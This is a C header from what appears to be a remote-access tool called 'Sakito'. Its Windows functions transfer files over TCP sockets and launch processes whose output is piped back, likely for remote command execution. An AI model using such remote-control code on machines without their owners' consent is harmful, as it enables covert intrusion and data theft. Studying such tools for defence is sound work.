/* 
Coded by d4rkstat1c.
Use educationally/legally.
*/
#include "os_check.h"
#ifndef SAKITO_CORE_H
#define SAKITO_CORE_H

#define BUFLEN 8192
#define SUCCESS 1
#define FAILURE -1
#define EXIT_SUCCESS 0
#define INIT_CONN "1"
#define FTRANSFER_FINISHED "1"
#define FTRANSFER_START "1"
#define DIR_NOT_FOUND '0'

#if OS_WIN
	#include <WS2tcpip.h>
	#include <Windows.h>
	#include <inttypes.h>
	HANDLE sakito_win_openf(const LPCTSTR filename, const DWORD desired_access, const DWORD creation_dispostion) 
	{
		return CreateFile(filename,
				desired_access,
				0,
				NULL,
				creation_dispostion,
				FILE_ATTRIBUTE_NORMAL,
				NULL);
	}

	uint64_t sakito_win_fsize(HANDLE h_file) 
	{
	   	// Get file size and serialize file size bytes.
		LARGE_INTEGER largeint_struct;
		GetFileSizeEx(h_file, &largeint_struct);
		return (uint64_t)largeint_struct.QuadPart;
	}

	// Function for sending file to client (TCP file transfer).
	int sakito_win_sendf(HANDLE h_file, const SOCKET socket, char* const buf, uint64_t f_size) 
	{
		uint64_t f_size_bytes = htonll(f_size);

		// Send serialized file size int32 bytes to server.
		if (send(socket, (char*)&f_size_bytes, sizeof(uint64_t), 0) < 1)
			return SOCKET_ERROR;

		int i_result = SUCCESS;

		if (f_size > 0) 
		{
			// Recursively read file until EOF is detected and send file bytes to client in BUFLEN chunks.
			DWORD bytes_read;
			while ((ReadFile(h_file, buf, BUFLEN, &bytes_read, NULL))
				&& (bytes_read != 0)
				&& (i_result > 0))
				i_result = send(socket, buf, bytes_read, 0);
		}

		// Close the file.
		CloseHandle(h_file);

		return i_result;
	}

	// Function to receive file from client (TCP file transfer).
	int sakito_win_recvf(HANDLE h_file, const SOCKET socket, char* const buf, uint64_t f_size) 
	{
		int i_result = 1;

		// Receive all file bytes/chunks and write to parsed filename.
		uint64_t total = 0;
		DWORD bytes_written;

		if (f_size > 0)
		{
			do
				i_result = recv(socket, buf, BUFLEN, 0);
			while ((WriteFile(h_file, buf, i_result, &bytes_written, NULL))
					&& ((total += bytes_written) != f_size)
					&& (i_result > 0));
		}

		return i_result;
	}

	BOOL sakito_win_cp(HANDLE child_stdout_write, const LPSTR buf)
	{
		// Create a child process that uses the previously created pipes for STDIN and STDOUT.
		PROCESS_INFORMATION pi; 
		STARTUPINFO si;
		memset(&pi, 0, sizeof(pi));
		memset(&si, 0, sizeof(si));

		// Set up members of the STARTUPINFO structure. 
		// This structure specifies the STDIN and STDOUT handles for redirection.
		if (child_stdout_write) 
		{
			si.cb = sizeof(STARTUPINFO);
			si.hStdError = child_stdout_write;
			si.hStdOutput = child_stdout_write;
			si.dwFlags |= STARTF_USESTDHANDLES;
		}

		// 7 + 1 for null termination/string truncation.

		// Create the child process.
		BOOL i_result = CreateProcess(NULL, 
						buf,
						NULL,
						NULL,
						TRUE,
						0,
						NULL,
						NULL,
						&si,
						&pi);

		if (i_result && !child_stdout_write)
			// Wait until child process exits.
			WaitForSingleObject(pi.hProcess, INFINITE);
		else
			CloseHandle(child_stdout_write);

		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);

		return i_result;
	}
#endif

// Function to copy uint64_t bytes to new memory block/location to abide strict aliasing.
static inline uint64_t ntohll_conv(char* const buf) 
{
	uint64_t new;
	memcpy(&new, buf, sizeof(new));

	// Return deserialized bytes.
	return ntohll(new);
}

#endif
